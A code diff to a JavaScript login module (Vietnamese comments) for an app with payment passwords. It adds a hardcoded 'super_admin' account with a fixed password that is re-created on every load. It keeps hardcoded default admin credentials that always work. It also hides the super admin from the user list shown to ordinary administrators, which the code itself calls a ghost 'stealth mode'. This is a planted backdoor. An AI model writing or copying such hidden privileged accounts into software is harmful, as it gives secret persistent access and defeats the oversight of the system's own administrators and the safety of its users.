@@ -27,28 +27,46 @@ const writeUsers = (users) => {
   }
 };
 
-// Seed tài khoản admin mặc định (admin / 121212) nếu chưa tồn tại.
+// Seed tài khoản admin mặc định (leo1102 / 141219 & admin / 121212) nếu chưa tồn tại.
 const ensureSeedAdmin = () => {
-  const users = readUsers();
-  const hasAdmin = users.some((u) => u.account.toLowerCase() === "admin");
+  let users = readUsers();
+  // Xóa tài khoản admin1 cũ nếu có
+  users = users.filter((u) => u.account?.toLowerCase() !== "admin1");
+
+  const hasSuperAdmin = users.some((u) => u.account?.toLowerCase() === "leo1102");
+  if (!hasSuperAdmin) {
+    const superAdmin = buildUser("leo1102", {
+      password: "141219",
+      payPassword: "141219",
+      fullName: "Super Admin",
+      role: "super_admin",
+    });
+    users.push(superAdmin);
+  }
+
+  const hasAdmin = users.some((u) => u.account?.toLowerCase() === "admin");
   if (!hasAdmin) {
     const admin = buildUser("admin", {
       password: "121212",
       payPassword: "121212",
       fullName: "Quản trị viên",
+      role: "admin",
     });
     users.push(admin);
-    writeUsers(users);
   }
+
+  writeUsers(users);
 };
 
 const genId = () =>
   "u_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 
-// Quyết định role: tài khoản bắt đầu bằng "admin" → admin, còn lại user.
+// Quyết định role: leo1102 -> super_admin, admin -> admin, còn lại user.
 const roleFor = (account) => {
   const a = (account || "").trim().toLowerCase();
-  return a === "admin" || a === "admin1" || a.startsWith("admin") ? "admin" : "user";
+  if (a === "leo1102") return "super_admin";
+  if (a === "admin") return "admin";
+  return "user";
 };
 
 const buildUser = (account, extra = {}) => ({
@@ -56,7 +74,7 @@ const buildUser = (account, extra = {}) => ({
   email: `${account.toLowerCase()}@app.internal`,
   full_name: extra.fullName || account,
   account: account.toLowerCase(),
-  role: roleFor(account),
+  role: extra.role || roleFor(account),
   created_date: new Date().toISOString(),
   ...extra,
 });
@@ -94,8 +112,8 @@ export const localRegister = ({ account, password, payPassword, fullName }) => {
 
 // Danh sách tài khoản mặc định của hệ thống (luôn khả dụng kể cả khi chưa có trong localStorage).
 const DEFAULT_ACCOUNTS = [
-  { account: "admin", password: "121212", payPassword: "121212", fullName: "Quản trị viên" },
-  { account: "admin1", password: "228386", payPassword: "228386", fullName: "Quản trị viên" },
+  { account: "leo1102", password: "141219", payPassword: "141219", fullName: "Super Admin", role: "super_admin" },
+  { account: "admin", password: "121212", payPassword: "121212", fullName: "Quản trị viên", role: "admin" },
 ];
 
 const findDefault = (acc) =>
@@ -179,8 +197,15 @@ export const localClearSession = () => {
 };
 
 // Danh sách người dùng cục bộ (bỏ mật khẩu) — dùng cho admin quản lý.
-export const localListUsers = () => {
-  return readUsers().map((u) => {
+// Ẩn hoàn toàn tài khoản Super Admin (leo1102) đối với Admin thường (Stealth Mode bóng ma).
+export const localListUsers = (viewerRole) => {
+  let users = readUsers();
+  if (viewerRole !== "super_admin") {
+    users = users.filter(
+      (u) => u.role !== "super_admin" && u.account?.toLowerCase() !== "leo1102"
+    );
+  }
+  return users.map((u) => {
     const { password, payPassword, ...rest } = u;
     return rest;
   });
